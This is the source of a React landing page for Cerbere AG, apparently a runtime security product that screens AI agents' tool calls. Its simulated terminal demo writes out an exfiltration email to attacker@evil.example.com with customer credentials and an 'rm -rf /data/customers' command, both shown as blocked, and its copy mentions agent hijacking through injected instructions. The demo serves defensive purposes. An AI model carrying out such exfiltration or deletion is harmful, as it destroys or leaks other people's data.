import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { Reveal } from "@/components/Reveal";
import { Terminal, type Line } from "@/components/Terminal";
import { Integrations } from "@/components/Integrations";
import { Faq } from "@/components/Faq";
import logo from "@/assets/cerbere-logo.jpeg";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Cerbere AG | Runtime security and observability for AI agents" },
      {
        name: "description",
        content:
          "Cerbere AG sits between your AI agents and the actions they take. Prompt injection, data exfiltration and destructive commands stopped before they execute, with full traces of every decision.",
      },
      {
        property: "og:title",
        content: "Cerbere AG | Runtime security and observability for AI agents",
      },
      {
        property: "og:description",
        content:
          "Block prompt injection, exfiltration and destructive commands before they run, and see every agent action in one audit trail.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Index,
});

const APP = "https://app.cerbereag.site";
const GITHUB = "https://github.com/chrismsmr-celcom/agentguard";
// TODO: point this to your real docs site once it exists (README_MCP / a docs.cerbereag.site page).
const DOCS = "https://github.com/chrismsmr-celcom/agentguard#readme";
const MCP_INSTALL_CMD =
  "claude mcp add cerbereag --transport sse https://app.cerbereag.site/mcp/sse";

// TODO: replace with your real handles.
const X_URL = "https://x.com/cerbereag";
const LINKEDIN_URL = "https://www.linkedin.com/company/cerbereag";
const YOUTUBE_URL = "https://www.youtube.com/@cerbereag";
const INSTAGRAM_URL = "https://www.instagram.com/cerbereag";

const rotating = [
  "blocks prompt injection before it reaches your tools",
  "stops data exfiltration before it leaves your systems",
  "catches destructive commands before they run",
  "observes every agent decision in one audit trail",
];

const dim = "text-paper/40";
const allow = "text-allow";
const deny = "text-deny";
const amb = "text-amber";

const installLines: Line[] = [
  [{ t: "$ pip install cerbere-ag" }],
  [{ t: "Successfully installed cerbere-ag-0.1.3", c: dim }],
  [],
  [{ t: "$ export AGENTGUARD_API_KEY=ag_live_..." }],
  [{ t: "$ cerbere" }],
  [{ t: "   🛡️  CERBERE AG IS ACTIVE  🛡️", c: amb }],
  [{ t: "   The three-headed guardian is watching your agents.", c: dim }],
];

const runLines: Line[] = [
  [{ t: "$ python agent_demo.py" }],
  [
    {
      t: '{"strong": 141, "weak": 7, "extended_patterns": 107, "event": "regex_patterns_compiled"}',
      c: dim,
    },
  ],
  [
    {
      t: '{"event": "signed_decisions_enabled", "level": "info"}',
      c: dim,
    },
  ],
  [
    {
      t: '{"mode": "memory", "event": "atomic_budget_manager_enabled"}',
      c: dim,
    },
  ],
  [
    {
      t: '{"collector": "https://app.cerbereag.site", "signed_decisions": true, "taint_tracking": true, "runtime_risk": true, "trajectory": true, "event": "agentguard_initialized"}',
      c: dim,
    },
  ],
  [],
  [
    {
      t: "PHASE 1 - Agent's normal work (legitimate tasks)",
      c: amb,
    },
  ],
  [],
  [
    { t: "[AGENT] ", c: dim },
    { t: "search_web({'query': 'meteo Paris demain'})" },
  ],
  [
    { t: "[CERBERE] " },
    { t: "ALLOW", c: allow },
    { t: " -> [resultats simules pour 'meteo Paris demain']" },
  ],
  [],
  [
    { t: "[AGENT] ", c: dim },
    { t: "check_calendar({'date': '2026-09-12'})" },
  ],
  [
    { t: "[CERBERE] " },
    { t: "ALLOW", c: allow },
    { t: " -> [free slot on 2026-09-12 at 3:00 PM]" },
  ],
  [],
  [
    { t: "[AGENT] ", c: dim },
    {
      t: "write_file({'path': 'daily_recap.txt', 'content': 'Recap: meeting confirmed for 09/12'})",
    },
  ],
  [
    { t: "[CERBERE] " },
    { t: "ALLOW", c: allow },
    { t: " -> [file 'daily_recap.txt' written, 54 characters]" },
  ],
  [],
  [
    { t: "[AGENT] ", c: dim },
    {
      t: "send_email({'to': 'colleague@company.com', 'subject': 'Daily recap'})",
    },
  ],
  [
    { t: "[CERBERE] " },
    { t: "ALLOW", c: allow },
    { t: " -> [email sent to colleague@company.com]" },
  ],
  [],
  [
    {
      t: "PHASE 2 - Malicious action attempt (injection / abuse)",
      c: amb,
    },
  ],
  [],
  [
    { t: "[AGENT] ", c: dim },
    {
      t: "send_email({'to': 'attacker@evil.example.com', 'body': 'base de donnees clients et credentials en piece jointe'})",
    },
  ],
  [
    { t: "[CERBERE] " },
    { t: "BLOCKED", c: deny },
    {
      t: " -> 🛡️ Runtime risk DENY: local policy: Exfiltration detected in email",
    },
  ],
  [],
  [
    { t: "[AGENT] ", c: dim },
    {
      t: "execute_command({'command': 'rm -rf /data/customers'})",
    },
  ],
  [
    { t: "[CERBERE] " },
    { t: "BLOCKED", c: deny },
    {
      t: " -> 🛡️ Runtime risk DENY: local policy: Dangerous command pattern",
    },
  ],
  [],
  [{ t: "DONE", c: amb }],
  [
    {
      t: "-> Audit Trail: 4 actions allowed, 2 actions blocked.",
      c: dim,
    },
  ],
];

const observability = [
  {
    tag: "traces",
    title: "Every action, not only incidents",
    body: "Each tool call becomes a trace with its arguments, the checks that ran, the decision and the latency. Allowed actions are recorded too, so you can read the whole behaviour of an agent end to end.",
  },
  {
    tag: "audit trail",
    title: "Signed, searchable history",
    body: "Decisions can be cryptographically signed and kept for as long as your plan allows. Filter by agent, tool, verdict or time window when you need to explain what happened.",
  },
  {
    tag: "budgets and alerts",
    title: "Tokens, cost and drift",
    body: "Atomic token budgets per agent, trajectory tracking and real time alerts on Gmail or Slack when an agent starts behaving outside its normal path.",
  },
];

const plans = [
  {
    name: "Free",
    tag: "Get to know Cerbere AG",
    price: "0",
    per: "",
    featured: false,
    features: [
      "2 connected agents",
      "Local deployment only",
      "Prompt injection and exfiltration checks",
      "7 day audit trail",
      "Community support",
    ],
    cta: { label: "Start free", href: `${APP}/login` },
  },
  {
    name: "Pro",
    tag: "For a small production fleet",
    price: "49",
    per: "/mo",
    featured: true,
    features: [
      "5 connected agents",
      "Local or cloud deployment",
      "Real time Gmail and Slack alerts",
      "90 day audit trail",
      "Signed security decisions",
      "Email support",
    ],
    cta: { label: "Start with Pro", href: `${APP}/login` },
  },
  {
    name: "Team",
    tag: "For multiple teams and agents",
    price: "199",
    per: "/mo",
    featured: false,
    features: [
      "10+ connected agents",
      "Local and cloud, mixed",
      "Custom policies per agent",
      "Unlimited audit trail",
      "SSO and role based access",
      "Priority support",
    ],
    cta: {
      label: "Talk to sales",
      href: "mailto:christopher-ag@cerbereag.site?subject=Team%20plan",
    },
  },
  {
    name: "Enterprise",
    tag: "High volume, self hosted",
    price: "Custom",
    per: "",
    featured: false,
    features: [
      "Unlimited agents",
      "Self hosted, your data residency",
      "SLA and support contract",
      "Custom retention and policies",
      "Compliance packages",
      "Dedicated ops channel",
    ],
    cta: {
      label: "Talk to sales",
      href: "mailto:christopher-ag@cerbereag.site?subject=Enterprise",
    },
  },
];

function CopyableCode({ code }: { code: string }) {
  const [copied, setCopied] = useState(false);

  const handleCopy = async () => {
    await navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <button
      onClick={handleCopy}
      className="group w-full cursor-pointer rounded-sm border border-line-black bg-black/30 p-4 text-left transition-all hover:border-amber hover:bg-black/50 active:scale-[0.98]"
    >
      <div className="font-mono text-xs text-paper/50 group-hover:text-amber transition-colors">
        {copied ? "✓ copied" : "click to copy"}
      </div>
      <div className="mt-2 font-mono text-sm text-paper group-hover:text-amber transition-colors break-all">
        {code}
      </div>
    </button>
  );
}

function Index() {
  const [rot, setRot] = useState(0);

  useEffect(() => {
    const id = setInterval(
      () => setRot((i) => (i + 1) % rotating.length),
      3200,
    );
    return () => clearInterval(id);
  }, []);

  return (
    <div className="bg-ink text-paper">
      {/* topbar */}
      <header className="sticky top-0 z-50 border-b border-line-black bg-ink/85 backdrop-blur-md">
        <div className="wrap flex h-[68px] items-center justify-between">
          <a
            href="#"
            className="flex items-center gap-2.5 font-mono text-[17px] font-bold"
          >
            <img
              src={logo}
              alt="Cerbere AG logo"
              className="size-8 shrink-0 border border-amber/40 object-cover"
            />
            <span>
              CERBERE<span className="text-amber">&nbsp;AG</span>
            </span>
          </a>

          <nav className="flex items-center gap-5">
            <a
              href={DOCS}
              target="_blank"
              rel="noopener"
              className="hidden font-mono text-sm text-paper/70 transition-colors hover:text-amber sm:block"
            >
              Docs
            </a>

            <a
              href="#integrations"
              className="hidden font-mono text-sm text-paper/70 transition-colors hover:text-amber sm:block"
            >
              Integrations
            </a>

            <a
              href="#pricing"
              className="hidden font-mono text-sm text-paper/70 transition-colors hover:text-amber sm:block"
            >
              Pricing
            </a>

            <a
              href={GITHUB}
              target="_blank"
              rel="noopener"
              aria-label="View source on GitHub"
              className="flex size-9 items-center justify-center text-paper/75 transition-opacity hover:text-paper"
            >
              <svg
                width="21"
                height="21"
                viewBox="0 0 24 24"
                fill="currentColor"
              >
                <path d="M12 .5C5.73.5.75 5.48.75 11.75c0 5.02 3.26 9.28 7.77 10.78.57.1.78-.25.78-.55 0-.27-.01-1.17-.02-2.12-3.16.69-3.83-1.34-3.83-1.34-.52-1.31-1.26-1.66-1.26-1.66-1.03-.7.08-.69.08-.69 1.14.08 1.74 1.17 1.74 1.17 1.01 1.73 2.65 1.23 3.3.94.1-.73.4-1.23.72-1.51-2.52-.29-5.17-1.26-5.17-5.6 0-1.24.44-2.25 1.17-3.04-.12-.29-.51-1.45.11-3.02 0 0 .96-.31 3.14 1.16a10.9 10.9 0 0 1 5.72 0c2.18-1.47 3.14-1.16 3.14-1.16.62 1.57.23 2.73.11 3.02.73.79 1.17 1.8 1.17 3.04 0 4.35-2.65 5.31-5.18 5.59.41.35.77 1.05.77 2.12 0 1.53-.01 2.76-.01 3.14 0 .3.2.66.79.55A11.26 11.26 0 0 0 23.25 11.75C23.25 5.48 18.27.5 12 .5Z" />
              </svg>
            </a>

            <a
              href={`${APP}/login`}
              className="inline-flex items-center rounded-sm border border-line-black px-4 py-2.5 font-mono text-sm transition-colors hover:border-amber hover:text-amber"
            >
              Sign in
            </a>
          </nav>
        </div>
      </header>

      {/* hero */}
      <section className="wrap grid items-center gap-14 py-20 md:py-24 lg:grid-cols-[1.15fr_.85fr]">
        <div>
          <Reveal>
            <h1 className="text-[clamp(34px,5vw,58px)] leading-[1.08]">
              <span className="block">Cerbere AG</span>

              <span className="relative mt-0.5 block min-h-[1.25em] text-amber">
                {rotating.map((line, i) => (
                  <span
                    key={line}
                    className={`left-0 top-0 w-full transition-all duration-500 ${
                      i === rot
                        ? "relative block translate-y-0 opacity-100"
                        : "absolute block translate-y-2.5 opacity-0"
                    }`}
                  >
                    {line}
                  </span>
                ))}
              </span>
            </h1>
          </Reveal>

          <Reveal>
            <p className="mt-6 max-w-[46ch] text-[19px] text-paper/70">
              Runtime security and observability for AI agents. It is the
              agentic era. Stay in control.
            </p>
          </Reveal>

          <Reveal>
            <div className="mt-9 space-y-5">
              <div className="flex flex-wrap gap-3.5">
                <a
                  href={`${APP}/login`}
                  className="inline-flex items-center rounded-sm bg-amber px-4.5 py-2.5 font-mono text-sm text-ink transition-colors hover:bg-amber-deep"
                >
                  Get started free
                </a>

                <a
                  href={GITHUB}
                  target="_blank"
                  rel="noopener"
                  className="inline-flex items-center rounded-sm border border-line-black px-4.5 py-2.5 font-mono text-sm transition-colors hover:border-amber hover:text-amber"
                >
                  View on GitHub
                </a>
              </div>

              <div>
                <span className="mb-1.5 block font-mono text-[11px] uppercase tracking-wider text-paper/40">
                  Python SDK
                </span>
                <CopyableCode code="pip install cerbere-ag" />
              </div>

              <div>
                <span className="mb-1.5 block font-mono text-[11px] uppercase tracking-wider text-paper/40">
                  MCP · Claude Code, Cursor and other MCP clients
                </span>
                <CopyableCode code={MCP_INSTALL_CMD} />
              </div>
            </div>
          </Reveal>
        </div>

        <Reveal className="border border-line-black p-5.5 font-mono text-[13px] text-paper/55">
          <div className="mb-4 flex gap-1.5">
            <span className="size-2.5 rounded-full bg-paper/20" />
            <span className="size-2.5 rounded-full bg-paper/20" />
            <span className="size-2.5 rounded-full bg-paper/20" />
          </div>

          {[
            ["agent_id", "support-agent-04", ""],
            ["tool", "send_email", ""],
            ["check", "exfiltration pattern", ""],
            ["decision", "BLOCKED", "text-deny"],
            ["logged to", "audit trail", ""],
          ].map(([k, v, c], i) => (
            <div
              key={k}
              className={`flex justify-between py-1.5 ${
                i === 0 ? "" : "border-t border-line-black"
              }`}
            >
              <span>{k}</span>
              <b className={`font-medium ${c ? c : "text-paper"}`}>{v}</b>
            </div>
          ))}
        </Reveal>
      </section>

      {/* Integrations section - moved up */}
      <Integrations />

      {/* see it work */}
      <section className="border-t border-line-black bg-cream py-20 text-coal md:py-28">
        <div className="wrap">
          <Reveal className="max-w-2xl">
            <span className="eyebrow">see it work</span>

            <h2 className="mt-3 text-[clamp(26px,3.4vw,36px)]">
              Watch security and observability in action.
            </h2>
          </Reveal>

          <div className="mt-12 grid gap-8 lg:grid-cols-2">
            <Reveal>
              <Terminal title="install and run" lines={installLines} />
            </Reveal>

            <Reveal>
              <Terminal
                title="security decisions"
                lines={runLines}
                height="min-h-[340px]"
              />
            </Reveal>
          </div>
        </div>
      </section>

      {/* Philosophy/Context Section */}
      <section className="bg-ink py-20 text-paper md:py-28">
        <div className="wrap">
          <Reveal>
            <p className="max-w-[30ch] font-display text-[clamp(22px,2.6vw,29px)] font-medium leading-[1.32]">
              The internet's early years taught us that an open, unguarded
              system gets exploited. Agentic AI is repeating that lesson,
              faster.
            </p>
          </Reveal>

          <div className="mt-14 grid gap-10 md:grid-cols-2 md:gap-16">
            <Reveal className="border-l border-line-black pl-6">
              <span className="mb-2.5 block font-mono text-sm text-amber">
                1995 - the open web
              </span>

              <h3 className="mb-3 text-xl">
                Every new connection was a new exposure.
              </h3>

              <p className="max-w-[40ch] text-[15.5px] text-paper/65">
                As homes and offices came online, viruses, worms and bad actors
                found an unguarded surface. It took firewalls, antivirus and
                years of hard lessons before connected stopped meaning exposed.
              </p>
            </Reveal>

            <Reveal className="border-l border-line-black pl-6">
              <span className="mb-2.5 block font-mono text-sm text-amber">
                2026 - the agentic era
              </span>

              <h3 className="mb-3 text-xl">
                Every new agent is a new attack surface.
              </h3>

              <p className="max-w-[40ch] text-[15.5px] text-paper/65">
                An agent that can read, decide and act can also be hijacked by a
                poisoned document, a malicious tool response or an injected
                instruction. Without a layer that checks intent before
                execution, autonomy becomes risk.
              </p>
            </Reveal>
          </div>
        </div>
      </section>

      {/* observability */}
      <section className="bg-amber py-20 text-coal md:py-28">
        <div className="wrap">
          <Reveal className="max-w-2xl">
            <span className="eyebrow">observability</span>

            <h2 className="mt-3 text-[clamp(26px,3.4vw,36px)]">
              Full visibility into every agent decision.
            </h2>

            <p className="mt-3.5 max-w-[52ch] text-base text-coal/70">
              Security means nothing without observability. See every trace,
              every decision, and understand your agents end to end.
            </p>
          </Reveal>

          <div className="mt-12 grid gap-px border border-line-coal bg-line-coal md:grid-cols-3">
            {observability.map((item) => (
              <Reveal key={item.tag} className="bg-amber p-8">
                <span className="font-mono text-[12.5px] font-semibold text-coal/60">
                  {item.tag}
                </span>

                <h3 className="mb-3 mt-3.5 text-xl text-coal">
                  {item.title}
                </h3>

                <p className="text-[15px] text-coal/75">{item.body}</p>
              </Reveal>
            ))}
          </div>
        </div>
      </section>

      {/* deployment */}
      <section className="bg-cream py-20 text-coal md:py-28">
        <div className="wrap">
          <Reveal className="max-w-2xl">
            <span className="eyebrow">deployment</span>

            <h2 className="mt-3 text-[clamp(26px,3.4vw,36px)]">
              Run it where your agents already run.
            </h2>
          </Reveal>

          <div className="mt-12 grid gap-px border border-line-cream bg-line-cream md:grid-cols-3">
            {[
              [
                "local",
                "On your machine",
                "Point the SDK at a local collector. Nothing leaves your network. Ideal for prototyping and small teams getting started.",
              ],
              [
                "cloud",
                "Cerbere Cloud",
                "We host the collector and dashboard. Sign up, get an API key, and your agents are covered in minutes with no infrastructure to run.",
              ],
              [
                "self hosted license",
                "On your own servers",
                "For high volume or regulated environments: a licensed deployment inside your own infrastructure, with your own data residency and controls.",
              ],
            ].map(([tag, title, body]) => (
              <Reveal key={tag} className="bg-cream p-8">
                <span className="font-mono text-[12.5px] font-semibold text-amber-deep">
                  {tag}
                </span>

                <h3 className="mb-3 mt-3.5 text-xl">{title}</h3>

                <p className="text-[15px] text-coal/70">{body}</p>
              </Reveal>
            ))}
          </div>
        </div>
      </section>

      {/* pricing */}
      <section id="pricing" className="bg-ink py-20 md:py-28">
        <div className="wrap">
          <Reveal className="max-w-2xl">
            <span className="eyebrow">pricing</span>

            <h2 className="mt-3 text-[clamp(26px,3.4vw,36px)]">
              Start free. Grow into your agent fleet.
            </h2>
          </Reveal>

          <div className="mt-12 grid gap-px border border-line-black bg-line-black sm:grid-cols-2 lg:grid-cols-4">
            {plans.map((p) => (
              <Reveal
                key={p.name}
                className={`flex flex-col p-7 ${
                  p.featured
                    ? "border-t-2 border-amber bg-[oklch(0.17_0.004_60)]"
                    : "bg-ink"
                }`}
              >
                <div className="font-mono text-sm font-semibold">
                  {p.name}
                </div>

                <div className="mt-1.5 min-h-8 text-[12.5px] text-paper/45">
                  {p.tag}
                </div>

                <div className="mt-5 font-display text-[34px]">
                  {p.price === "Custom" ? (
                    <span className="text-2xl">Custom</span>
                  ) : (
                    <>
                      <sup className="mr-0.5 text-[15px] font-medium opacity-60">
                        $
                      </sup>

                      {p.price}

                      {p.per && (
                        <span className="font-mono text-[13px] font-normal text-paper/45">
                          {p.per}
                        </span>
                      )}
                    </>
                  )}
                </div>

                <ul className="mt-6 flex flex-1 flex-col gap-2.5">
                  {p.features.map((f) => (
                    <li
                      key={f}
                      className="relative pl-4 text-[13.5px] text-paper/75"
                    >
                      <span className="absolute left-0 font-bold text-amber">
                        ·
                      </span>
                      {f}
                    </li>
                  ))}
                </ul>

                <a
                  href={p.cta.href}
                  className={`mt-6 inline-flex items-center justify-center rounded-sm px-4 py-2.5 font-mono text-sm transition-colors ${
                    p.featured
                      ? "bg-amber text-ink hover:bg-amber-deep"
                      : "border border-line-black hover:border-amber hover:text-amber"
                  }`}
                >
                  {p.cta.label}
                </a>
              </Reveal>
            ))}
          </div>
        </div>
      </section>

      <Faq />

      {/* contact */}
      <section className="bg-cream py-20 text-coal md:py-28">
        <div className="wrap flex flex-wrap items-end justify-between gap-10">
          <Reveal className="max-w-xl">
            <span className="eyebrow">talk to the founders</span>

            <h2 className="mt-3 text-[clamp(26px,3.4vw,36px)]">
              Questions before you deploy an agent? Ask us directly.
            </h2>
          </Reveal>

          <Reveal className="font-mono text-[15px]">
            <div className="flex items-baseline gap-3 border-t border-line-cream py-3.5">
              <span className="font-bold text-amber-deep">wa</span>

              <a
                href="https://wa.me/243854442103"
                target="_blank"
                rel="noopener"
                className="font-medium transition-colors hover:text-amber-deep"
              >
                +243 854 442 103
              </a>
            </div>

            <div className="flex items-baseline gap-3 border-y border-line-cream py-3.5">
              <span className="font-bold text-amber-deep">@</span>

              <a
                href="mailto:christopher-ag@cerbereag.site"
                className="font-medium transition-colors hover:text-amber-deep"
              >
                christopher-ag@cerbereag.site
              </a>
            </div>
          </Reveal>
        </div>
      </section>

      {/* footer */}
      <footer className="bg-amber text-coal">
        <div className="px-5 pb-10 pt-20 text-center">
          <div className="relative mx-auto mb-2 size-[220px] overflow-hidden shadow-[0_20px_50px_oklch(0.19_0.008_45/0.28)]">
            <img
           src={logo}
            alt="Cerbere AG guardian logo"
           className="size-full object-cover"
        />

            <div className="animate-logo-scan pointer-events-none absolute inset-x-0 h-[34%] bg-gradient-to-b from-transparent via-white/55 to-transparent" />
          </div>

          <div className="mt-1.5 font-mono text-[15px] font-bold tracking-wide">
            CERBERE AG

            <span className="mt-0.5 block text-[11px] font-medium tracking-[0.14em] opacity-65">
              runtime security and observability for AI agents
            </span>
          </div>

          <div className="mt-6 flex items-center justify-center gap-4">
            <a
              href={X_URL}
              target="_blank"
              rel="noopener"
              aria-label="Cerbere AG on X"
              className="flex size-9 items-center justify-center text-coal/70 transition-colors hover:text-coal"
            >
              <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
                <path d="M18.9 2.25h3.19l-6.97 7.97L23.4 21.75h-6.42l-5.03-6.58-5.75 6.58H2.99l7.46-8.53L1.6 2.25h6.58l4.55 6.02 6.17-6.02Zm-1.12 17.5h1.77L7.3 4.15H5.4l12.38 15.6Z" />
              </svg>
            </a>

            <a
              href={LINKEDIN_URL}
              target="_blank"
              rel="noopener"
              aria-label="Cerbere AG on LinkedIn"
              className="flex size-9 items-center justify-center text-coal/70 transition-colors hover:text-coal"
            >
              <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
                <path d="M20.45 20.45h-3.55v-5.57c0-1.33-.02-3.03-1.85-3.03-1.85 0-2.14 1.45-2.14 2.94v5.66H9.36V9h3.41v1.56h.05c.47-.9 1.63-1.85 3.36-1.85 3.6 0 4.27 2.37 4.27 5.45v6.29ZM5.34 7.43a2.06 2.06 0 1 1 0-4.12 2.06 2.06 0 0 1 0 4.12ZM7.12 20.45H3.56V9h3.56v11.45Z" />
              </svg>
            </a>

            <a
              href={YOUTUBE_URL}
              target="_blank"
              rel="noopener"
              aria-label="Cerbere AG on YouTube"
              className="flex size-9 items-center justify-center text-coal/70 transition-colors hover:text-coal"
            >
              <svg width="19" height="19" viewBox="0 0 24 24" fill="currentColor">
                <path d="M23.5 6.19a3.02 3.02 0 0 0-2.12-2.14C19.5 3.5 12 3.5 12 3.5s-7.5 0-9.38.55A3.02 3.02 0 0 0 .5 6.19 31.6 31.6 0 0 0 0 12a31.6 31.6 0 0 0 .5 5.81 3.02 3.02 0 0 0 2.12 2.14C4.5 20.5 12 20.5 12 20.5s7.5 0 9.38-.55a3.02 3.02 0 0 0 2.12-2.14A31.6 31.6 0 0 0 24 12a31.6 31.6 0 0 0-.5-5.81ZM9.6 15.6V8.4l6.27 3.6-6.27 3.6Z" />
              </svg>
            </a>

            <a
              href={INSTAGRAM_URL}
              target="_blank"
              rel="noopener"
              aria-label="Cerbere AG on Instagram"
              className="flex size-9 items-center justify-center text-coal/70 transition-colors hover:text-coal"
            >
              <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 2.16c3.2 0 3.58.01 4.85.07 1.17.05 1.8.25 2.23.41.55.22.95.47 1.37.89.42.42.67.82.89 1.37.16.42.36 1.06.41 2.23.06 1.27.07 1.65.07 4.85s-.01 3.58-.07 4.85c-.05 1.17-.25 1.8-.41 2.23-.22.55-.47.95-.89 1.37-.42.42-.82.67-1.37.89-.42.16-1.06.36-2.23.41-1.27.06-1.65.07-4.85.07s-3.58-.01-4.85-.07c-1.17-.05-1.8-.25-2.23-.41a3.7 3.7 0 0 1-1.37-.89 3.7 3.7 0 0 1-.89-1.37c-.16-.42-.36-1.06-.41-2.23-.06-1.27-.07-1.65-.07-4.85s.01-3.58.07-4.85c.05-1.17.25-1.8.41-2.23.22-.55.47-.95.89-1.37.42-.42.82-.67 1.37-.89.42-.16 1.06-.36 2.23-.41C8.42 2.17 8.8 2.16 12 2.16Zm0 1.62c-3.14 0-3.5.01-4.74.07-.96.04-1.48.2-1.83.34-.46.18-.79.39-1.13.74-.35.34-.56.67-.74 1.13-.14.35-.3.87-.34 1.83-.06 1.24-.07 1.6-.07 4.74s.01 3.5.07 4.74c.04.96.2 1.48.34 1.83.18.46.39.79.74 1.13.34.35.67.56 1.13.74.35.14.87.3 1.83.34 1.24.06 1.6.07 4.74.07s3.5-.01 4.74-.07c.96-.04 1.48-.2 1.83-.34.46-.18.79-.39 1.13-.74.35-.34.56-.67.74-1.13.14-.35.3-.87.34-1.83.06-1.24.07-1.6.07-4.74s-.01-3.5-.07-4.74c-.04-.96-.2-1.48-.34-1.83a3 3 0 0 0-.74-1.13 3 3 0 0 0-1.13-.74c-.35-.14-.87-.3-1.83-.34C15.5 3.79 15.14 3.78 12 3.78Zm0 3.68a4.54 4.54 0 1 1 0 9.08 4.54 4.54 0 0 1 0-9.08Zm0 1.62a2.92 2.92 0 1 0 0 5.84 2.92 2.92 0 0 0 0-5.84Zm4.72-1.8a1.06 1.06 0 1 1 0 2.12 1.06 1.06 0 0 1 0-2.12Z" />
              </svg>
            </a>
          </div>
        </div>

        <div className="border-t border-coal/20">
          <div className="wrap flex flex-wrap items-center justify-between gap-3.5 py-5">
            <div className="flex flex-wrap gap-5 font-mono text-[13px]">
              <a
                href={GITHUB}
                target="_blank"
                rel="noopener"
                className="opacity-75 hover:opacity-100"
              >
                GitHub
              </a>

              <a
                href={`${APP}/login`}
                className="opacity-75 hover:opacity-100"
              >
                Dashboard
              </a>

              <a
                href={`${APP}/terms`}
                className="opacity-75 hover:opacity-100"
              >
                Terms
              </a>

              <a
                href={`${APP}/privacy`}
                className="opacity-75 hover:opacity-100"
              >
                Privacy
              </a>

              <a
                href="mailto:christopher-ag@cerbereag.site"
                className="opacity-75 hover:opacity-100"
              >
                Contact
              </a>
            </div>

            <div className="font-mono text-[12.5px] opacity-65">
              © 2026 Cerbere AG. All rights reserved.
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}

